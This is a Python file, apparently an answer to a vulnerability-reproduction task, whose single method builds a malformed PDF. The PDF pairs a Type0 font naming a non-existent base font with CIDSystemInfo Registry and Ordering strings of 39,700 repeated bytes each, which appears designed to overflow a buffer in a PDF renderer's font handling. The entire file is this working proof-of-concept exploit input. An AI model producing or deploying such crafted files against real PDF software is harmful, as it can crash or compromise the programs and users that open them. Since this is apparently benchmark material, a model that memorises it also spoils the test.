class Solution:
    def solve(self, src_path: str) -> bytes:
        registry = b'A' * 39700
        ordering = b'B' * 39700
        parts = []
        offsets = [0]
        header = b'%PDF-1.7\n%����\n'
        parts.append(header)
        current_offset = len(header)
        # Object 1: Catalog
        offsets.append(current_offset)
        obj1 = b'1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n\n'
        parts.append(obj1)
        current_offset += len(obj1)
        # Object 2: Pages
        offsets.append(current_offset)
        obj2 = b'2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n\n'
        parts.append(obj2)
        current_offset += len(obj2)
        # Object 3: Page
        offsets.append(current_offset)
        obj3 = b'3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>\nendobj\n\n'
        parts.append(obj3)
        current_offset += len(obj3)
        # Object 4: Contents
        offsets.append(current_offset)
        stream_content = b'BT\n/F1 12 Tf\n72 720 Td\n(Hello World!) Tj\nET'
        stream_len = len(stream_content)
        obj4 = b'4 0 obj\n<< /Length ' + str(stream_len).encode() + b' >>\nstream\n' + stream_content + b'\nendstream\nendobj\n\n'
        parts.append(obj4)
        current_offset += len(obj4)
        # Object 5: Type0 Font
        offsets.append(current_offset)
        basefont = b'/NonExistentFont'
        obj5 = b'5 0 obj\n<< /Type /Font /Subtype /Type0 /BaseFont ' + basefont + b' /DescendantFonts [6 0 R] /Encoding /Identity-H >>\nendobj\n\n'
        parts.append(obj5)
        current_offset += len(obj5)
        # Object 6: CIDFont
        offsets.append(current_offset)
        obj6 = b'6 0 obj\n<< /Type /Font /Subtype /CIDFontType2 /BaseFont ' + basefont + b' /CIDSystemInfo 7 0 R /DW 1000 /W [0 [1000]] >>\nendobj\n\n'
        parts.append(obj6)
        current_offset += len(obj6)
        # Object 7: CIDSystemInfo
        offsets.append(current_offset)
        reg_str = b'(' + registry + b')'
        ord_str = b'(' + ordering + b')'
        obj7 = b'7 0 obj\n<< /Registry ' + reg_str + b' /Ordering ' + ord_str + b' /Supplement 0 >>\nendobj\n\n'
        parts.append(obj7)
        current_offset += len(obj7)
        # Xref
        xref_offset = current_offset
        xref = b'xref\n0 8\n'
        xref += b'0000000000 65535 f \n'
        for i in range(1, 8):
            off = offsets[i]
            xref += f'{off:010d}'.encode() + b' 00000 n \n'
        xref += b'trailer\n<< /Size 8 /Root 1 0 R >>\n'
        startxref_line = b'startxref\n' + str(xref_offset).encode() + b'\n%%EOF\n'
        body = b''.join(parts)
        full_pdf = body + xref + startxref_line
        return full_pdf
